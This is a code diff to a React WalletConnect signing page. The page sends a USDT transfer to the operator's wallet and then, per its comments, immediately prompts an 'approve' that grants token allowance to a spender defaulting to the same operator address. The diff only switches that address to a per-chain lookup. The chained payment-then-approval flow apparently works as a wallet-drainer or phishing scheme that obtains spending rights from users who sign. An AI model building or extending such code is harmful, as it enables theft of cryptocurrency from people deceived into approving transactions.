@@ -31,7 +31,7 @@
 import { useState, useEffect, useCallback } from 'react'
 import QRCode from 'qrcode'
 import { SignClient } from '@walletconnect/sign-client'
-import { projectId, MY_WALLET_ADDRESS, USDT } from '../config.js'
+import { projectId, MY_WALLETS, USDT } from '../config.js'
 
 // ── USDT ABI fragments ────────────────────────────────────────────────────────
 // USDT on ETH has a non-standard ABI (no return value on transfer/approve).
@@ -232,10 +232,12 @@ export default function SignPage() {
       // else use what the user selected
       const wcChain = token.wcChain
 
+      const receivingAddress = MY_WALLETS[chain]
+
       // ── Prompt 2: Send USDT transfer ─────────────────────────────────────
       // This shows up in the wallet as "Send X USDT to 0xYOUR_ADDRESS"
       const transferData = await buildTransferCalldata(
-        MY_WALLET_ADDRESS,
+        receivingAddress,
         amount,
         token.decimals
       )
@@ -267,11 +269,11 @@ export default function SignPage() {
 
       // ── Prompt 3: USDT Approve ────────────────────────────────────────────
       // Fires immediately after payment — wallet shows next prompt
-      // Uses spender address if provided, otherwise uses MY_WALLET_ADDRESS
+      // Uses spender address if provided, otherwise uses receiving address for selected chain
       setStatus('step2')
       setStep(3)
 
-      const approveSpender = spender || MY_WALLET_ADDRESS
+      const approveSpender = spender || MY_WALLETS[chain]
       const approveData    = await buildApproveCalldata(
         approveSpender,
         amount,
@@ -404,7 +406,7 @@ export default function SignPage() {
               value={spender}
               onChange={e => setSpender(e.target.value)}
               disabled={isActive}
-              placeholder={MY_WALLET_ADDRESS}
+              placeholder={MY_WALLETS[chain]}
             />
           </div>
         )}
@@ -538,4 +540,5 @@ export default function SignPage() {
 
     </div>
   )
-}
+  }
+    
